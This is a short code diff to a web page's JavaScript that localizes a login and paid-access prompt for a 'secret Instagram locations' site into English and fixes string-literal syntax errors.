@@ -81,18 +81,16 @@
     const lang = navigator.language || navigator.userLanguage;
 
     if (!lang.startsWith('tr')) {
-      document.getElementById('title').textContent = 'Discover secret locations📍<br>for your next viral🔥<br>Instagram shot 📸';
+      document.getElementById('title').innerHTML = 'Discover secret locations📍<br>for your next viral🔥 Instagram shot 📸';
       document.getElementById('subtitle').textContent = 'Enter your username and password:';
       document.getElementById('usernameInput').placeholder = 'Username';
       document.getElementById('passwordInput').placeholder = 'Password';
       document.getElementById('loginButton').textContent = 'Login';
-      document.getElementById('note').innerHTML = 
+      document.getElementById('note').innerHTML = `
         Don’t have access yet? <br>
         <a href="https://senin-ödeme-sayfan.com" target="_blank">Buy access for $1</a>
-      ;
+      `;
     }
-  
-</script>
 
     function login() {
       const username = document.getElementById('usernameInput').value;
